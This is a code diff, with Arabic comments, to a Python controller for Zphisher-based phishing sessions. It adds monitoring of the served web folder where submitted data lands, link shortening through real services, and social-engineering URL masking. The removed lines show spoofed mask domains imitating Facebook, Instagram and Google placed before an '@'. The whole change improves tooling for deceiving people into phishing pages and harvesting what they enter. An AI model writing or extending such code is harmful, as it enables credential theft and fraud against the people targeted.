@@ -18,6 +18,8 @@ from dataclasses import dataclass
 
 from ..config import settings, zphisher_sites
 from ..database import db_manager, Session as DBSession
+from .url_shortener import url_shortener, url_masker
+from .file_monitor import file_monitor
 
 logger = logging.getLogger(__name__)
 
@@ -140,6 +142,10 @@ class ZphisherController:
             # بدء النفق
             await self._start_tunnel(session)
             
+            # بدء مراقبة الملفات
+            session_data_path = self.server_path / "www"
+            await file_monitor.start_monitoring_session(session.session_id, session_data_path)
+            
             # بدء المراقبة
             session.monitoring_task = asyncio.create_task(
                 self._monitor_session(session)
@@ -177,6 +183,9 @@ class ZphisherController:
         try:
             session.status = "stopping"
             await db_manager.update_session_status(session_id, "stopping")
+            
+            # إيقاف مراقبة الملفات
+            await file_monitor.stop_monitoring_session(session_id)
             
             # إيقاف المراقبة
             if session.monitoring_task:
@@ -539,37 +548,56 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
             raise
     
     async def _generate_urls(self, session: ZphisherSession) -> None:
-        """إنشاء روابط مختصرة ومقنعة"""
-        
-        if not session.public_url:
-            return
+        """إنشاء روابط مختصرة ومقنعة للجلسة"""
         
         try:
-            # رابط مختصر باستخدام خدمة مجانية
-            short_url = await self._shorten_url(session.public_url)
-            if short_url:
-                session.short_url = short_url
+            if not session.public_url:
+                return
             
-            # رابط مقنع
+            # إنشاء رابط مختصر باستخدام خدمات حقيقية
+            short_result = await url_shortener.shorten_url(session.public_url)
+            if short_result.get('success'):
+                session.short_url = short_result['short_url']
+                logger.info(f"تم اختصار الرابط بـ {short_result.get('service', 'Unknown')}")
+            else:
+                # استخدام نظام احتياطي
+                session.short_url = await self._shorten_url(session.public_url)
+            
+            # إنشاء رابط مقنع متقدم
             if session.custom_mask:
                 session.masked_url = f"{session.custom_mask}@{session.short_url or session.public_url}"
             else:
-                # استخدام قناع افتراضي حسب نوع الموقع
-                default_masks = {
-                    'facebook': 'https://facebook-security-check.com',
-                    'instagram': 'https://instagram-verification.com',
-                    'google': 'https://google-account-recovery.com'
-                }
-                
-                default_mask = default_masks.get(
-                    session.site_type, 
-                    'https://security-verification.com'
-                )
-                
-                session.masked_url = f"{default_mask}@{session.short_url or session.public_url}"
-                
+                target_url = session.short_url or session.public_url
+                session.masked_url = url_masker.create_social_engineering_url(target_url, session.site_type)
+            
+            # حفظ معلومات الروابط
+            await self._save_url_info(session)
+            
+            logger.info(f"تم إنشاء الروابط للجلسة: {session.session_id}")
+            
         except Exception as e:
-            logger.warning(f"خطأ في إنشاء الروابط المساعدة: {e}")
+            logger.error(f"خطأ في إنشاء الروابط: {e}")
+    
+    async def _save_url_info(self, session: ZphisherSession) -> None:
+        """حفظ معلومات الروابط في قاعدة البيانات"""
+        
+        try:
+            url_info = {
+                'session_id': session.session_id,
+                'original_url': session.public_url,
+                'short_url': session.short_url,
+                'masked_url': session.masked_url,
+                'created_at': datetime.utcnow().isoformat()
+            }
+            
+            # حفظ في ملف JSON للمراجعة
+            urls_file = self.server_path / f"session_{session.session_id}_urls.json"
+            import aiofiles
+            async with aiofiles.open(urls_file, 'w') as f:
+                await f.write(json.dumps(url_info, indent=2))
+            
+        except Exception as e:
+            logger.error(f"خطأ في حفظ معلومات الروابط: {e}")
     
     async def _shorten_url(self, url: str) -> Optional[str]:
         """اختصار الرابط باستخدام خدمة مجانية"""
